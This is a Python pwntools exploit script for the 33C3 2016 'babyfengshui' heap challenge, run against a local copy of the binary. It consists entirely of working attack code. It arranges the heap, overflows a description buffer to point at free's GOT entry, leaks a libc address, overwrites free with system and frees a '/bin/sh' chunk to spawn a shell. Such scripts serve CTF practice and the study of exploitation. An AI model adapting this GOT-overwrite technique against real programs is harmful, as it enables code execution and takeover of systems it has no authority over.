from pwn import*
context.log_level  = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_28_babyfengshui_33c3_2016')
libc = elf.libc
p = process('./data/bin/heap23_28_babyfengshui_33c3_2016')

def add(size,name,length,text):
	p.recvuntil(b'Action: ')
	p.sendline(b'0')
	p.recvuntil(b'size of description: ')
	p.sendline(str(size))
	p.recvuntil(b'name: ')
	p.sendline(name)
	p.recvuntil(b'text length: ')
	p.sendline(str(length))
	p.recvuntil(b'text: ')
	p.sendline(text)

def delete(id):
	p.recvuntil(b'Action: ')
	p.sendline(b'1')
	p.recvuntil(b'index: ')
	p.sendline(str(id))

def show(id):
	p.recvuntil(b'Action: ')
	p.sendline(b'2')
	p.recvuntil(b'index: ')
	p.sendline(str(id))

def update(id,length,text):
	p.recvuntil(b'Action: ')
	p.sendline(b'3')
	p.recvuntil(b'index: ')
	p.sendline(str(id))
	p.recvuntil(b'text length: ')
	p.sendline(str(length))
	p.recvuntil(b'text: ')
	p.sendline(text)

add(0x80,b'nam1',0x80,b'aaaa');add(0x80,b'nam2',0x80,b'bbbb');add(0x80,b'nam3',0x80,b'/bin/sh\x00')
delete(0)
add(0x100,b'name1',0x100,b'cccc')
free_got = elf.got['free'];payload = b'a'*0x108 + b'a'*8 + b'a'*0x80 + b'a'*8 + p32(free_got);update(3,0x200,payload)
show(1);p.recvuntil(b'description: ');free_addr = u32(p.recv(4));libc_base = free_addr - libc.sym['free'];system = libc_base + libc.sym['system'];print(hex(system))
update(1,0x80,p32(system))
delete(2)
p.interactive()